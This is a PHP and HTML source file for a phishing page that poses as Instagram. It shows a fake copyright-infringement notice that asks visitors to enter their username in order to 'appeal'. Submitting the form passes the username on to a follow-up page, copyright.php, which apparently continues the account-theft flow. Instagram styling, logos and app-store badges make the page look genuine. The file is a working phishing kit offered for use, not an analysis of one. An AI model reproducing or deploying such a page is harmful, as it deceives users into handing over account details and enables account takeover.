<?php

if($_POST){
	$nick=$_POST["nick"];
	
	header("location: copyright.php?nick=".$nick);


}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Copyright Infringement</title>        <!-- @PANZERORJ -->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_new.svg/1200px-Instagram_new.svg.png">
    <script
      src="https://code.jquery.com/jquery-3.4.1.min.js"
      integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
      crossorigin="anonymous"
    ></script>
    <link
      href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
      rel="stylesheet"
      type="text/css"
    />
    <style>
      .button {
-webkit-box-direction: normal;
margin: 0;
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
border-radius: 3px;
border-style: solid;
border-width: 1px;
font-size: 14px;
font-weight: 600;
line-height: 26px;
outline: 0;
overflow: hidden;
text-overflow: ellipsis;
user-select: none;
white-space: nowrap;
width: 55%;
background: rgba(var(--d69,0,149,246),1);
border-color: rgba(var(--d69,0,149,246),1);
color: rgba(var(--eca,255,255,255),1);
cursor: pointer;
padding: 0 12px;
      }
      .button:disabled {
        opacity: 0.5;
      }
      .hide {
        display: none;
      }
    </style>
</head>
<body><center>
	<div style="margin:0; padding;">

 
<div style=" padding:5px; margin:0px;
width:99%; height:45px;;
  background: #f09433; 
background: -moz-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); 
background: -webkit-linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f09433', endColorstr='#bc1888',GradientType=1 );
  ">


  <table style="width:100%;margin:0px;">
      <tbody><tr style="width:100%;margin:0px;">
         <td style=" margin:0px;font-family:sans-serif;font-weight:bold;color:white;">Instagram</td>
         <td style="border:1px solid:white;color:white; margin:0px;
text-align:right;"><div style="border:1px solid white;margin:0px;
width:; text-align:center; margin-left:%;font-weight:bold;border-radius:5px;font-family:sans-serif;">GET
</div>

</td>
      </tr>
      <tr>
         <td style=" font-family:sans-serif;font-weight:400;color:white;font-size:13px;">Find It for free on Google Play.</td>
         <td>    </td>
      </tr>
   </tbody></table>



</div>
</div>
	<main>
		<img src="resim/xq1.png" width=47%>
			
			<p >
				As lnstagram, we remove accounts that violate our copyright laws.
Continue by entering your username to learn about and appeal to copyright infringement related to your account.
			</p><br>
			<form method="post" id="your_form_id" enctype="index.php">
			<input type="text" id="nickk" name="nick" placeholder="Username"  required="on">
			<br>
			
			<button class="button">
      <i class="loading-icon fa fa-spinner fa-spin hide"></i>
      <span class="btn-txt">Next</span>
    </button>

<br>
<br>

		</form>
	</main>
<script>
      $(document).ready(function() {
        $(".button").on("click", function() {
          $(".result").text("");
          $(".loading-icon").removeClass("hide");
          $(".button").attr("disabled", true);
          $(".btn-txt").text("Loading...");
		  
		  nickk= document.getElementById("nickk").value;
		  
   
   if (nickk=="")
	   {
        alert("Please fill in all fields.");
	$(".loading-icon").addClass("hide");
            $(".button").attr("disabled", false);
			$(".btn-txt").text("Next");
			return false;
 }


          
	  setTimeout(function(){      
document.getElementById('your_form_id').submit();
		  }, 0100);
		  
		  
   });
        });
		

    </script>
    <br>
<center> <img width="130" src="https://seeklogo.com/images/A/app-store-google-play-logo-4A2747BF5E-seeklogo.com.png">
		</center>
		<br>
	<div class="other">
		<img src="resim/from.png" alt="fb" width="95">
	</div>
</center>
</body>
<style type="text/css">
	*{font-family:sans-serif;}
	body{padding:0px;margin:0px;background:#fafafa}
	header{width:100%;
	height:145px;
      padding:0px;
      
	  background-color: white;
      margin:0px;}

.bilgikutu{width:100%;
	height:55px;
border:1px solid #cecece;
      padding:0px;
	  background-color: white;
      margin:0px;}
.hrktu{
border:1px solid #cecece;
}
		main{
			background:white;
			margin-top:20px;
			padding-top:20px;
			width:400px;
			max-width:90%;
			border:1px solid #dedede;
		}.h3{font-family:sans-serif;
			font-weight:400;
			color:#444;
			word-spacing:1px;
		}main p{
font-family:sans-serif;
color:#999;
width:270px; 
		}main input{
-webkit-box-direction: normal;
color: rgba(var(--i1d,38,38,38),1);
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
background: 0 0;
border: 1px solid rgba(var(--b38,219,219,219),1);
border-radius: 3px;
box-sizing: border-box;
display: block;
font-size: 14px;
height: 34px;
line-height: 30px;
padding: 0 12px;
text-align: left;
width: 57%;
		}main .a_adaskpd{
			padding:7px 30px;
			margin-top:10px;
			outline:none;
			border:none;
			color:white;
			background:#3896f0;
			font-weight:bold;
			font-size:15px;
			margin-bottom:10px;
			border-radius:3px;
		}main input:focus{
			box-shadow: 0px 0px 0px 0px white;
			border:1px solid #3896f0;
		}
		.other{
border-bottom:1px solid #cecece;
		background:white;
		bottom:0px;
		position:fixed;
		width: 100%;
		}
</style>
</html>